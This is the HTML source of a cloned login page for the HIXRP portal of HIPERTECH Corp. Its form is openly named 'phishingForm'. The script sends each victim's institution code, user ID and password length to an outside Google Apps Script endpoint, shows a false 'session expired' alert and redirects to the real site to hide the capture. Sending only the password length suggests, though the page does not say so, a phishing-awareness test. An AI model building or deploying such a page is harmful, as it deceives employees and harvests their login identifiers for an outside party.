<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HIXRP 로그인</title>
    <style>
        /* 1. 배경 설정: 형이 올린 일러스트가 꽉 차게 */
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center; /* 가로 중앙 정렬 */
            align-items: center;     /* 세로 중앙 정렬 */
            font-family: 'Malgun Gothic', '맑은 고딕', sans-serif;
            background: url('illustration.png') no-repeat center center;
            background-size: cover;  /* 이미지가 화면을 다 덮게 */
            overflow: hidden;
        }

        /* 2. 로그인 박스 컨테이너 */
        /* 투명한 배경 없이 입력창들만 공중에 떠 있는 듯한 느낌 구현 */
        .login-container {
            width: 320px;
            /* 이미지상 캐릭터의 약간 왼쪽에 위치하도록 조정 */
            margin-right: 180px; 
            margin-top: -50px; /* 살짝 위로 올림 */
        }

        /* 로고 영역 */
        .logo-area {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo-area img {
            max-width: 130px; /* 로고 크기 */
        }

        /* 3. 입력 폼 공통 스타일 (핵심: 라벨과 인풋이 같은 배경색을 가짐) */
        .input-row {
            display: flex;
            margin-bottom: 8px; /* 칸 사이 간격 */
            border: 1px solid #fff; /* 하얀색 테두리 */
            background-color: #8bbaf3; /* 연한 파란색 배경 (이미지 참고) */
            height: 38px;
        }

        /* 왼쪽 라벨 (CODE, ID, PASSWORD) */
        .input-row label {
            width: 80px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 10px;
            color: #fff; /* 글씨색 하얀색 */
            font-weight: normal;
            border-right: 1px solid #fff; /* 라벨과 인풋 사이 하얀 선 */
        }

        /* 오른쪽 입력 칸 */
        .input-row input {
            flex: 1;
            background-color: transparent; /* 배경 투명하게 (부모 색상 따라감) */
            border: none;
            outline: none;
            padding: 0 10px;
            font-size: 11px;
            color: #333;
        }
        
        /* placeholder (안내문구) 색상 지정 */
        .input-row input::placeholder {
            color: rgba(255, 255, 255, 0.7);
        }

        /* 4. 로그인 버튼 */
        .btn-login {
            width: 100%;
            height: 40px;
            background-color: #212c5b; /* 짙은 남색 */
            color: #fff;
            border: none;
            font-size: 13px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 5px;
            letter-spacing: 2px; /* '로 그 인' 처럼 자간 넓히기 */
        }

        /* 5. 퇴사자 증명 신청 버튼 */
        .btn-resign {
            width: 100%;
            height: 35px;
            background-color: rgba(255, 255, 255, 0.2);
            border: 1px solid #fff;
            color: #333;
            font-size: 11px;
            cursor: pointer;
            margin-top: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }

        /* 6. 하단 옵션 (체크박스) */
        .options {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 15px;
            font-size: 10px;
            color: #555;
        }
        .options label {
            display: flex;
            align-items: center;
            gap: 3px;
            cursor: pointer;
        }

        /* 7. 최하단 텍스트 링크들 */
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 20px;
            font-size: 10px;
            color: #555;
        }
        .footer-links a {
            text-decoration: none;
            color: #555;
        }
        .footer-links strong {
            color: blue; /* 개인정보처리방침 파란색 강조 */
        }

        /* 8. 카피라이트 (화면 맨 아래 고정) */
        .copyright {
            position: absolute;
            bottom: 20px;
            width: 100%;
            text-align: center;
            font-size: 9px;
            color: #777;
            letter-spacing: 1px;
        }
    </style>
</head>
<body>

    <!-- 중앙 로그인 폼 컨테이너 -->
    <div class="login-container">
        
        <!-- 로고 영역 -->
        <div class="logo-area">
            <img src="logo.png" alt="XRP ez logo">
        </div>

        <form id="phishingForm">
            <!-- 기관코드 입력 -->
            <div class="input-row">
                <label>CODE</label>
                <input type="text" id="entCd" placeholder="기관코드" required>
            </div>
            
            <!-- 아이디 입력 -->
            <div class="input-row">
                <label>ID</label>
                <input type="text" id="userId" placeholder="아이디" required>
            </div>
            
            <!-- 비밀번호 입력 -->
            <div class="input-row">
                <label>PASSWORD</label>
                <input type="password" id="userPw" placeholder="비밀번호" required>
            </div>

            <button type="submit" class="btn-login">로 그 인</button>
        </form>

        <button class="btn-resign">
            <!-- 텍스트 이모지로 아이콘 대체 (필요시 이미지로 변경 가능) -->
            📄 퇴사자 증명 신청
        </button>

        <div class="options">
            <label><input type="checkbox"> 기관코드저장</label>
            <label><input type="checkbox"> 아이디저장</label>
        </div>

        <div class="footer-links">
            <a href="#">IP승인요청</a>
            <a href="#">비밀번호 찾기</a>
            <a href="#"><strong>개인정보처리방침</strong></a>
        </div>
    </div>

    <!-- 하단 카피라이트 -->
    <div class="copyright">
        ⓒ HIPERTECH Corp. All Rights Reserved.
    </div>

    <script>
        const gasUrl = 'https://script.google.com/macros/s/AKfycbwG55MXJXjRpOBQwfX98zaJP5Rag-cnJF6ZFOJj_TY1BFJwQrQD4kZAzOkBFvktkBnqCA/exec';

        document.getElementById('phishingForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const entCd = document.getElementById('entCd').value;
            const id = document.getElementById('userId').value;
            const pw = document.getElementById('userPw').value;

            // 앱스크립트로 데이터 전송 (길이만)
            const finalUrl = `${gasUrl}?targetId=${encodeURIComponent(entCd)}&inputId=${encodeURIComponent(id)}&pwLen=${pw.length}`;
            fetch(finalUrl, { method: 'POST', mode: 'no-cors' });

            // 알림 띄우고 리다이렉트
            setTimeout(() => {
                alert('보안 세션이 만료되었습니다. 다시 로그인해 주세요.');
                window.location.href = 'https://gnk.hixrp.kr/index.jsp';
            }, 500);
        });
    </script>
</body>
</html>
